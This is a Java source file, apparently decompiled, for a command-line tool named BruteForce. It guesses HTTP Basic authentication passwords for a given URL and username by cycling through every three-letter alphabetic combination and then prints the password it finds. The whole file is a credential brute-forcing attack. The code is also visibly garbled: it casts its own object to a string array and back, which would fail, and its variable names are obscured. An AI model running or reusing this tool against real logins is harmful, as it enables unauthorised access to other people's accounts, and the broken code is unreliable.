import java.net.PasswordAuthentication;
import java.io.IOException;
import java.net.ProtocolException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.Authenticator;
public class BruteForce extends Authenticator {
    private String a;
    private URL b;
    private char[] c;
    private char[] d;
    public static void main ( String[] array ) {
        if ( array.length != 2 ) {
            System.err.println ( "usage: BruteForce <url> <username>" );
            System.exit ( 1 );
        }
        String[] array2 = null;
        try {
            array2 = ( String[] ) ( Object ) new BruteForce ( array[0], array[1] );
        } catch ( MalformedURLException ex ) {
            ex.printStackTrace();
            System.exit ( 1 );
        }
        Authenticator.setDefault ( ( Authenticator ) ( Object ) ( array = array2 ) );
        try {
            HttpURLConnection httpURLConnection;
            ( httpURLConnection = ( HttpURLConnection ) ( ( BruteForce ) ( Object ) array ).b.openConnection() ).connect();
            while ( httpURLConnection.getResponseCode() == 401 && ( ( BruteForce ) ( Object ) array ).c != null ) {
                try {
                    httpURLConnection.getInputStream();
                    httpURLConnection.connect();
                } catch ( ProtocolException ex4 ) {
                    httpURLConnection = ( HttpURLConnection ) ( ( BruteForce ) ( Object ) array ).b.openConnection();
                } catch ( NullPointerException ex2 ) {
                    ex2.printStackTrace();
                    System.exit ( 1 );
                }
            }
        } catch ( IOException ex3 ) {
            ex3.printStackTrace();
            System.exit ( 1 );
        }
        System.out.println ( "password=" + new String ( ( ( BruteForce ) ( Object ) array ).d ) );
        System.exit ( 0 );
    }
    private BruteForce ( final String s, final String a ) {
        this.b = new URL ( s );
        this.a = a;
        this.c = new char[] { 'a' };
    }
    public PasswordAuthentication getPasswordAuthentication() {
        if ( this.d == null ) {
            this.d = new char[] { 'A', 'A', 'A' };
            this.c = new char[] { 'A', 'A', 'B' };
        } else {
            this.d = this.c;
            if ( this.c[2] == 'Z' ) {
                this.c[2] = 'a';
            } else if ( this.c[2] != 'z' ) {
                int n = this.c[2];
                this.c[2] = ( char ) ( ++n );
            } else {
                this.c[2] = 'A';
                if ( this.c[1] == 'Z' ) {
                    this.c[1] = 'a';
                } else if ( this.c[1] != 'z' ) {
                    int n2 = this.c[1];
                    this.c[1] = ( char ) ( ++n2 );
                } else {
                    this.c[1] = 'A';
                    if ( this.c[0] == 'Z' ) {
                        this.c[0] = 'a';
                    } else if ( this.c[0] != 'z' ) {
                        int n3 = this.c[0];
                        this.c[0] = ( char ) ( ++n3 );
                    } else {
                        this.c = null;
                    }
                }
            }
        }
        return new PasswordAuthentication ( this.a, this.d );
    }
}
